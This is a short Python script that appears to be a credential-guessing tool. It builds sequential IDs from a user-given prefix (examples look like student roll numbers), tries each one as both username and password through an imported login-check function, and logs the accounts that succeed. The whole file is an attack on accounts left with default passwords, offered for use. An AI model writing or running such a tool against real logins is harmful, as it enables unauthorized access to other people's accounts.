__author__ = 'BluePie'
from time import sleep
from test2 import checking

def rec(prefix,ranges):
	series = prefix
	for t in range(1,ranges+1):
		series += str(t)
		check(series)
		series = prefix
		sleep(0.2)
		
def check(series):
	v1=v2=series
	XMLres=checking(v1,v2)
	if "success" in XMLres:
		print("Username:{},Password:{} WORKS".format(v1,v2))
		logtofile(v1)
	
def logtofile(uname):
	f = open('log.txt', 'a')
	f.write(uname+'\n')
	print ('written to log file{}'.format(uname))
	
		
if __name__ == '__main__':
	print ('#'*80)
	print("Version:1.8")
	print ('author:'+__author__)
	prefix = input("Enter the prefix:(eg:ts,es13cs,es14mca):")
	ranges = int(input("Enter the range:(only int):"))
	if (isinstance(prefix, str)):
		rec(prefix,ranges)
	
